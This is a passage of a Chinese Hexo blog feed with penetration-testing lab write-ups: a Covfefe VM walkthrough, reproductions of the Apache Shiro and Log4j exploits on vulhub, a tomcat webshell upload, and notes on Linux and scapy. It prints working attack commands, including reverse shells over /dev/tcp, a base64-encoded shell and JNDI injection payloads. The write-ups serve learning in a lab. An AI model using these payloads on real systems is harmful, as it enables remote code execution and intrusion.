id_rsa</code></pre><p>然后在authorized_keys里发现有个用户名叫simon的</p><p><img src="/2022/04/23/covfefe/image-20220423104702375.png" alt="image-20220423104702375"></p><p>尝试使用ssh登录</p><pre class=" language-Linux"><code class="language-Linux">ssh -i id_rsa simon@192.168.3.152</code></pre><p><img src="/2022/04/23/covfefe/image-20220423105121494.png" alt="image-20220423105121494"></p><p>发需要一个密码</p><h3 id="解密ssh秘钥信息"><a href="#解密ssh秘钥信息" class="headerlink" title="解密ssh秘钥信息"></a>解密ssh秘钥信息</h3><p>利用ssh2john将id_rsa秘钥信息转换为john可以识别的信息</p><pre class=" language-Linux"><code class="language-Linux">python /usr/share/john/ssh2john.py id_rsa > rsacrack </code></pre><p>然后使用字典破解</p><pre class=" language-Linux"><code class="language-Linux">zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules rsacrack</code></pre><p><img src="/2022/04/23/covfefe/image-20220423110016931.png" alt="image-20220423110016931"></p><p>发现密码是<code>starwars</code></p><p>尝试登录</p><p><img src="/2022/04/23/covfefe/image-20220423110137271.png" alt="image-20220423110137271"></p><p>登录成功</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>我们在root目录下发现有flag.txt，但是无法读取，因此需要提权</p><p>首先查找能够用root权限去执行哪些东西</p><pre class=" language-Linux"><code class="language-Linux">find / -perm -4000 2>/dev/null</code></pre><p><img src="/2022/04/23/covfefe/image-20220423110416933.png" alt="image-20220423110416933"></p><p>发现root里面有个<code>read_message.c</code>文件</p><p>接下来审计这个文件</p><p><img src="/2022/04/23/covfefe/image-20220423110636172.png" alt="image-20220423110636172"></p><p>在注释中发现flag2</p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>对代码进行审计</p><p>我们发现输入的值是保存在buf里，如果这个值的前5个字是Simon，就返回正确</p><p>因此输入的值超过20个，20个之后的就会被execve调用，就可以实现缓冲区溢出</p><p>获得flag</p><pre class=" language-Linux"><code class="language-Linux">SimonAAAAAAAAAAAAAAA/bin/shpwdwhoamicat flag.txt</code></pre><p><img src="/2022/04/23/covfefe/image-20220423111248490.png" alt="image-20220423111248490"></p><p>成功！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro550和Shiro721漏洞复现</title>
      <link href="/2022/04/22/Shiro/"/>
      <url>/2022/04/22/Shiro/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro550和Shiro721漏洞复现"><a href="#Shiro550和Shiro721漏洞复现" class="headerlink" title="Shiro550和Shiro721漏洞复现"></a>Shiro550和Shiro721漏洞复现</h1><h2 id="Shiro是个啥"><a href="#Shiro是个啥" class="headerlink" title="Shiro是个啥"></a>Shiro是个啥</h2><p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h2 id="Shiro-rememberMe反序列化漏洞-Shiro-550"><a href="#Shiro-rememberMe反序列化漏洞-Shiro-550" class="headerlink" title="Shiro rememberMe反序列化漏洞(Shiro-550)"></a>Shiro rememberMe反序列化漏洞(Shiro-550)</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>在登录框有一个 remember me（记住密码）的功能，用户的登录信息加密后存储在remember me的Cookie中。攻击者可以使用shiro默认密钥伪造用户Cookie，触发java反序列化漏洞，进而在目标机器上执行任意命令</p><p>cookie处理流程:cookie值 – Base64解码 – AES解密 – 反序列化</p></blockquote><p><code>用了AES加密的密钥，此密钥被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥</code></p><h3 id="payload产生过程"><a href="#payload产生过程" class="headerlink" title="payload产生过程"></a>payload产生过程</h3><blockquote><p>payload – 序列化 – AES加密 – Base64加密 – 发送cookie</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/shiro/CVE-2016-4437docker-compose up -d</code></pre><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><strong>Shiro特征：</strong></p><blockquote><p>登录时，点击记住密码，利用burpsuite抓包验证，看返回结果是否有rememberMe&#x3D;deleteMe</p></blockquote><p><img src="/2022/04/22/Shiro/image-20220422183856844.png" alt="image-20220422183856844"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.使用shiro_rce工具包</p><p><a href="https://github.com/wyzxxz/shiro_rce">https://github.com/wyzxxz/shiro_rce</a> </p><p>运行工具</p><pre class=" language-Linux"><code class="language-Linux">java -jar shiro_tool.jar http://192.168.3.151:8080</code></pre><p>通过<a href="http://www.dnslog.cn/%E9%9A%8F%E6%9C%BA%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AAdns">http://www.dnslog.cn/随机获得一个dns</a></p><p><img src="/2022/04/22/Shiro/image-20220423085407042.png" alt="image-20220423085407042"></p><p>然后在脚本中运行</p><pre class=" language-Linux"><code class="language-Linux">curl 96it7w.dnslog.cn</code></pre><p><img src="/2022/04/22/Shiro/image-20220423085606832.png" alt="image-20220423085606832"></p><p>解析出来了</p><p>然后构造反弹shell</p><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.151/8080 0>&1</code></pre><p><a href="https://x.hacking8.com/?post=293">https://x.hacking8.com/?post=293</a> 加密</p><p><img src="/2022/04/22/Shiro/image-20220423090533373.png" alt="image-20220423090533373"></p><p>nc连接</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 8888</code></pre><p>扔进工具里</p><p><img src="/2022/04/22/Shiro/image-20220423090343130.png" alt="image-20220423090343130"></p><p><img src="/2022/04/22/Shiro/image-20220423090359963.png" alt="image-20220423090359963"></p><p>成功</p><h2 id="Shiro-PADDING-ORACLE-ATTACK漏洞-Shiro-721"><a href="#Shiro-PADDING-ORACLE-ATTACK漏洞-Shiro-721" class="headerlink" title="Shiro PADDING ORACLE ATTACK漏洞(Shiro-721)"></a>Shiro PADDING ORACLE ATTACK漏洞(Shiro-721)</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j复现</title>
      <link href="/2022/04/22/Apache-Log4j/"/>
      <url>/2022/04/22/Apache-Log4j/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-44228-Apache-Log4j-远程代码执行漏洞"><a href="#CVE-2021-44228-Apache-Log4j-远程代码执行漏洞" class="headerlink" title="CVE-2021-44228 Apache Log4j 远程代码执行漏洞"></a>CVE-2021-44228 Apache Log4j 远程代码执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>2021年12月10日，国家信息安全漏洞共享平台（CNVD）收录了Apache Log4j2 远程代码执行漏洞（CNVD-2021-95914）。攻击者利用该漏洞，可在未授权的情况下远程执行代码。目前，漏洞利用细节已公开，Apache官方已发布补丁修复该漏洞。</p><p>Apache Log4j2是一个基于Java的日志记录组件，该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息，得益于其突出于其他日志的优势：异步日志实现。是最受欢迎的于开发时的日志组件。</p><p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2 远程代码执行漏洞。由于Log4j2 组件在处理程序日志记录时存在JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2 组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p><code>Apache Log4j2 2.x &lt;= 2.14.1</code></p><p><code>Apache Log4j2 2.15.0-rc1</code>（补丁绕过）</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>靶机ubuntu:192.168.3.151</p><p>使用vulhub</p><pre class=" language-Linux"><code class="language-Linux">cd vulhub/log4j/CVE-2021-44228docker-compose up -d</code></pre><p>在攻击段浏览器输入网址</p><pre class=" language-base"><code class="language-base">http://192.168.3.151:8983/solr/admin/cores?action=1</code></pre><p><img src="/2022/04/22/Apache-Log4j/image-20220422154732492.png" alt="image-20220422154732492"></p><p><img src="/2022/04/22/Apache-Log4j/image-20220422154758417.png" alt="image-20220422154758417"></p><h2 id="构造dnslog-payload参数"><a href="#构造dnslog-payload参数" class="headerlink" title="构造dnslog payload参数"></a>构造dnslog payload参数</h2><p>打开dnslog，点击这个，获取一个网址</p><p><img src="/2022/04/22/Apache-Log4j/image-20220422154951530.png" alt="image-20220422154951530"></p><p>然后构造</p><pre class=" language-base"><code class="language-base">$&#123;jndi:ldap://kz46l0.dnslog.cn&#125;</code></pre><p>在浏览器中输入</p><pre class=" language-base"><code class="language-base">http://192.168.3.151:8983/solr/admin/cores?action=$&#123;jndi:ldap://kz46l0.dnslog.cn&#125;</code></pre><p>发现在dnslog中出现信息，说明有这个漏洞</p><p><img src="/2022/04/22/Apache-Log4j/image-20220422155302798.png" alt="image-20220422155302798"></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>接下来使用工具</p><h3 id="安装编译"><a href="#安装编译" class="headerlink" title="安装编译"></a>安装编译</h3><pre class=" language-Linux"><code class="language-Linux">git clone https://github.com/welk1n/JNDI-Injection-Exploit.gitcd JNDI-Injection-Exploitmvn clean package -DskipTests //编译</code></pre><p>编译完成后就可以构造攻击参数了</p><p>构造连接参数</p><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/6969 0>&1</code></pre><p>base64加密</p><pre class=" language-base"><code class="language-base">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzY5NjkgMD4mMQ==</code></pre><p>然后进入target目录下</p><pre class=" language-Linux"><code class="language-Linux">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzY5NjkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;" -A 192.168.3.134</code></pre><p><img src="/2022/04/22/Apache-Log4j/image-20220422162953694.png" alt="image-20220422162953694"></p><p>监听端口6969</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 6969</code></pre><p>进行payload攻击</p><pre class=" language-base"><code class="language-base">http://192.168.3.151:8983/solr/admin/cores?action=$&#123;jndi:rmi://192.168.3.134:1099/edptqq&#125;</code></pre><p>nc连接上了</p><p><img src="/2022/04/22/Apache-Log4j/image-20220422163325153.png" alt="image-20220422163325153"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu搭建docker环境</title>
      <link href="/2022/04/21/docker/"/>
      <url>/2022/04/21/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux或Windows操作系统的机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。</p><p>一个完整的Docker有以下几个部分组成：</p><ol><li>DockerClient客户端</li><li>Docker Daemon守护进程</li><li>Docker Image镜像</li><li>DockerContainer容器</li></ol><h1 id="Linux搭建docker环境"><a href="#Linux搭建docker环境" class="headerlink" title="Linux搭建docker环境"></a>Linux搭建docker环境</h1><h2 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h2><pre class=" language-Linux"><code class="language-Linux">apt install docker.io</code></pre><p>查看是否安装成功</p><pre class=" language-Linux"><code class="language-Linux">docker --version</code></pre><p><img src="/2022/04/21/docker/image-20220421211900017.png" alt="image-20220421211900017"></p><p>成了</p><p>启动docker服务</p><pre class=" language-Linux"><code class="language-Linux">service docker start</code></pre><p>查看运行状态</p><pre class=" language-Linux"><code class="language-Linux">systemctl status docker</code></pre><p><img src="/2022/04/21/docker/image-20220421212446087.png" alt="image-20220421212446087"></p><h2 id="2-安装docker-compoase"><a href="#2-安装docker-compoase" class="headerlink" title="2.安装docker-compoase"></a>2.安装docker-compoase</h2><p>先安装pip</p><pre class=" language-Linux"><code class="language-Linux">apt install python3-pip</code></pre><p>成功</p><p><img src="/2022/04/21/docker/image-20220421230613435.png" alt="image-20220421230613435"></p><p>然后安装docker-compose</p><pre class=" language-Linux"><code class="language-Linux">apt install docker-compose</code></pre><p><img src="/2022/04/21/docker/image-20220421231700513.png" alt="image-20220421231700513"></p><p>成功</p><h2 id="3-设置国内镜像"><a href="#3-设置国内镜像" class="headerlink" title="3.设置国内镜像"></a>3.设置国内镜像</h2><pre class=" language-Linux"><code class="language-Linux">sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json <<-'EOF'&#123;  "registry-mirrors": ["https://l10nt4hq.mirror.aliyuncs.com"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><h2 id="4-安装vulhub"><a href="#4-安装vulhub" class="headerlink" title="4.安装vulhub"></a>4.安装vulhub</h2><p>git安装</p><pre class=" language-Linux"><code class="language-Linux">git clone https://github.com/vulhub/vulhub.git</code></pre><p>下载好了之后做一下测试</p><p>选取tomcat弱口令漏洞cd到所在目录</p><pre class=" language-Linux"><code class="language-Linux">cd vulhub/tomcat/tomcat8</code></pre><p>建立容器</p><pre class=" language-Linux"><code class="language-Linux">docker-compose build</code></pre><p><img src="/2022/04/21/docker/image-20220422112006964.png" alt="image-20220422112006964"></p><p>启动漏洞环境</p><pre class=" language-Linux"><code class="language-Linux">docker-compose up -d</code></pre><p><img src="/2022/04/21/docker/image-20220422112050870.png" alt="image-20220422112050870"></p><p>下载一下net-tools（可以使用ifconfig查看本机ip）</p><pre class=" language-Linux"><code class="language-Linux">apt-get install net-tools</code></pre><p>查看ip</p><pre class=" language-Linux"><code class="language-Linux">ifconfig</code></pre><p>然后测试一下</p><p>在网页中打开ip:8080</p><p><img src="/2022/04/21/docker/image-20220422112316219.png" alt="image-20220422112316219"></p><p>成功！</p><h1 id="tomcat8弱口令-任意文件上传"><a href="#tomcat8弱口令-任意文件上传" class="headerlink" title="tomcat8弱口令+任意文件上传"></a>tomcat8弱口令+任意文件上传</h1><p>tomcat8的默认账号和密码都是tomcat，我们点击server status进入后台</p><p><img src="/2022/04/21/docker/image-20220422133044531.png" alt="image-20220422133044531"></p><p><img src="/2022/04/21/docker/image-20220422133059843.png" alt="image-20220422133059843"></p><p>点击List Applications</p><p><img src="/2022/04/21/docker/image-20220422133239116.png" alt="image-20220422133239116"></p><p>找到上传点，可以上传.war文件</p><p><img src="/2022/04/21/docker/image-20220422141028122.png" alt="image-20220422141028122"></p><p>ps：</p><blockquote><p>里面是哥斯拉生成的木马</p></blockquote><p>解压war包：jar -xvf xxx.war<br>压缩war包：jar -cvf xxx.war *&#x2F;.</p><p>解压jar包：jar -xvf xxx.jar<br>压缩jar包：jar -cvf xxx.jar*&#x2F; </p><p><strong>上传成功</strong></p><p><img src="/2022/04/21/docker/image-20220422141057705.png" alt="image-20220422141057705"></p><p>测试好不好使</p><p><img src="/2022/04/21/docker/image-20220422144753585.png" alt="image-20220422144753585"></p><p>成了</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/361d7ede.html">互联网算法工程开发常用技术</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Linux </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webshell管理工具特征分析</title>
      <link href="/2022/04/20/signature-code/"/>
      <url>/2022/04/20/signature-code/</url>
      
        <content type="html"><![CDATA[<h1 id="Webshell管理工具特征分析"><a href="#Webshell管理工具特征分析" class="headerlink" title="Webshell管理工具特征分析"></a>Webshell管理工具特征分析</h1><h2 id="中国菜刀特征"><a href="#中国菜刀特征" class="headerlink" title="中国菜刀特征"></a>中国菜刀特征</h2><p>首先可以构造一句话木马，然后上传到靶机，用菜刀连接后进行抓包</p><p><img src="/2022/04/20/signature-code/image-20220420163121005.png" alt="image-20220420163121005"></p><p>通过抓到的数据包，然后追踪tcp流可以看到</p><p><img src="/2022/04/20/signature-code/image-20220420163209592.png" alt="image-20220420163209592"></p><p>这是通过base64加密</p><p>我们解密一下可以看到很明显的特征</p><p><img src="/2022/04/20/signature-code/image-20220420163456588.png" alt="image-20220420163456588"></p><p>此后我们再一次使用菜刀连接，发现</p><p><img src="/2022/04/20/signature-code/image-20220420171041094.png" alt="image-20220420171041094"></p><p>菜刀会随机生成x-forwarded-for</p><h2 id="蚁剑特征"><a href="#蚁剑特征" class="headerlink" title="蚁剑特征"></a>蚁剑特征</h2><p>老规矩，抓包</p><p><img src="/2022/04/20/signature-code/image-20220420173541200.png" alt="image-20220420173541200"></p><p>发现user-agent随机</p><p><img src="/2022/04/20/signature-code/image-20220420173631261.png" alt="image-20220420173631261"></p><p><img src="/2022/04/20/signature-code/image-20220420173647425.png" alt="image-20220420173647425"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Webshell </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础</title>
      <link href="/2022/04/15/Linux-Basics/"/>
      <url>/2022/04/15/Linux-Basics/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h1><h2 id="了解Linux操作系统以及层级结构"><a href="#了解Linux操作系统以及层级结构" class="headerlink" title="了解Linux操作系统以及层级结构"></a>了解Linux操作系统以及层级结构</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><blockquote><p>操作系统就是可以安装程序的程序</p><p>windows linux macos ios android</p></blockquote><p>os 硬件基础上的第一层软件</p><blockquote><p>文件系统———设备驱动程序————用户接口———–系统服务程序</p></blockquote><p>操作流程：</p><blockquote><p>用户 —应用程序—操作系统—硬件</p></blockquote><p>linux操作系统是开源的，类unix操作系统</p><h4 id="linux内核"><a href="#linux内核" class="headerlink" title="linux内核"></a>linux内核</h4><blockquote><p>硬件–内核层–shell层–应用层（x window）</p></blockquote><h4 id="linux发行版本"><a href="#linux发行版本" class="headerlink" title="linux发行版本"></a>linux发行版本</h4><p>发行版本：</p><p>商业发行版：red hat</p><p>社区组织维护发行版：debian</p><blockquote><p>red hatRHEL，CentOS，Fedora core<br>ubuntudebian发展来的<br>suse linux图形化非常方便<br>gentoo极客喜欢<br>debian安全，固若金汤，基本不死机</p></blockquote><h3 id="linux层次结构"><a href="#linux层次结构" class="headerlink" title="linux层次结构"></a>linux层次结构</h3><p>树状结构</p><p>根目录&#x3D;&#x3D;&#x2F;&#x3D;&#x3D;</p><h3 id="简单的命令"><a href="#简单的命令" class="headerlink" title="简单的命令"></a>简单的命令</h3><pre class=" language-Linux"><code class="language-Linux">pwd 查看当前自己在哪个文件夹中mkdir 文件夹名 新建文件夹 touch 文件名  新建文件vi vim linux中的编辑器ls 查看文件名，后缀可加参数-l -a之类的前缀有个d说明是文件夹，后面的rwx都是他的权限[root     @    luoye    ~ ]                 #当前用户      主机名    ~代表在家目录       表示root# root$ 其他人root用户的家目录 /root其他用户的家目录 /homecd 切换目录whoami 查看自己登录用户是谁passwd 更改密码history 查看之前敲过的命令alias abc=vi etc/passwd 给命令取别名unalias 取消系统的别名alias 查看别名vi /etc/bashrc 在后面添加alias，可以永久添加别名获得帮助ls --help安装中文手册yum -y install man-pages-zh-CN.noarchecho  "alias cman='man -M /usr/share/man/zh_CN'" >> .bashrccman ls 看到中文的ls命令介绍</code></pre><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><pre class=" language-Linux"><code class="language-Linux">重定向输入输出：0=标准输入1=标准正确输出2=标准错误输出echo $?查看上一个程序退出的状态码，不是0就是错误的重定向符号：> 覆盖重定向>> 追加重定向2> 覆盖重定向错误输出数据流2>>追加重定向错误输出数据流合并输出：&> 覆盖重定向&>> 追加重定向2>&1 把错误流重定向到标准的输出文件中1>&2 把正确流重定向到标准的输出文件中echo  haha 1> ./yes.out 2> ./no.out正确和错误分别输出到一些地方echo haha 1>&2 2> /root/path/no.out</code></pre><h2 id="Linux的文件管理和用户管理"><a href="#Linux的文件管理和用户管理" class="headerlink" title="Linux的文件管理和用户管理"></a>Linux的文件管理和用户管理</h2><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><h3 id="文件层次"><a href="#文件层次" class="headerlink" title="文件层次"></a>文件层次</h3><p><img src="/2022/04/15/Linux-Basics/image-20220415152821932.png" alt="image-20220415152821932"></p><blockquote><p>目录名和文件名长度不超过255字符<br>linux区分大小写<br>在Linux的世界里，一切都是文件</p></blockquote><h4 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h4><blockquote><p>不同方法表示file1</p><p>绝对路径：&#x2F;home&#x2F;user1&#x2F;file1<br>相对路径：</p><p>如果此时你在user1文件夹中file1  .&#x2F;file1<br>如果在user2文件夹下 ..&#x2F;user1&#x2F;file1</p></blockquote><h3 id="文件系统FSH"><a href="#文件系统FSH" class="headerlink" title="文件系统FSH"></a>文件系统FSH</h3><pre class=" language-Linux"><code class="language-Linux">bin 普通用户使用的命令sbin 管理员使用的命令dev 设备文件 /dev/null=垃圾桶root 最高用户的home文件home 普通用户的家proc 虚拟文件系统，内核，进程信息usr 系统文件/usr/local/ 软件安装目录/usr/bin/ 普通用户使用的程序/usr/sbin/ 管理员使用的程序/usr/lib 库文件/usr/lib64 64位的库文件boot 存放系统启动的相关文件，比如kernel引导程序etc 软件配置文件tmp 临时文件var 存储变化的文件，数据库，日志，邮件media 移动设备挂载mnt 手动挂载</code></pre><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><pre class=" language-Linux"><code class="language-Linux">touch hahamkdir wenjianjia/mkdir ./dir/wjj&#123;1,2,3,4,5&#125;</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/04/21/docker/">ubuntu搭建docker环境</a></li><li><a href="http://broken-year.github.io/2022/03/23/system-passwd/">操作系统权限及信息采集</a></li><li><a href="http://broken-year.github.io/2022/03/21/Linux-system/">渗透测试系统加渗透工具</a></li><li><a href="https://chengzhaoxi.xyz/119e14ff.html">大数据单机学习环境-MySQL</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 云计算 </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scapy基本操作</title>
      <link href="/2022/04/13/scapytest/"/>
      <url>/2022/04/13/scapytest/</url>
      
        <content type="html"><![CDATA[<h1 id="scapy基本操作"><a href="#scapy基本操作" class="headerlink" title="scapy基本操作"></a>scapy基本操作</h1><blockquote><p>首先通过pip安装scapy</p><p>pip3 install scapy</p><p>然后就可以在窗口打开scapy</p></blockquote><p><img src="/2022/04/13/scapytest/image-20220413132828510.png" alt="image-20220413132828510"></p><pre class=" language-python"><code class="language-python">ip<span class="token operator">=</span>IP<span class="token punctuation">(</span>dst <span class="token operator">=</span><span class="token string">"目标ip"</span><span class="token punctuation">)</span></code></pre><p><img src="/2022/04/13/scapytest/image-20220413133255339.png" alt="image-20220413133255339"></p><blockquote><p>构建广播数据包</p></blockquote><pre class=" language-python"><code class="language-python">Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"FF:FF:FF:FF:FF:FF"</span><span class="token punctuation">)</span></code></pre><blockquote><p>构建一个ping包并且发送</p></blockquote><pre class=" language-python"><code class="language-python">send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"目标ip"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">//</span>只发不收</code></pre><p><img src="/2022/04/13/scapytest/image-20220413133749079.png" alt="image-20220413133749079"></p><blockquote><p>随意填写数据</p></blockquote><pre class=" language-python"><code class="language-python">IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'目标ip'</span><span class="token punctuation">)</span><span class="token operator">/</span>fuzz<span class="token punctuation">(</span>TCP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2022/04/13/scapytest/image-20220413144755270.png" alt="image-20220413144755270"></p><blockquote><p>可以接收 sr sr1 srp</p></blockquote><pre class=" language-python"><code class="language-python">sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token 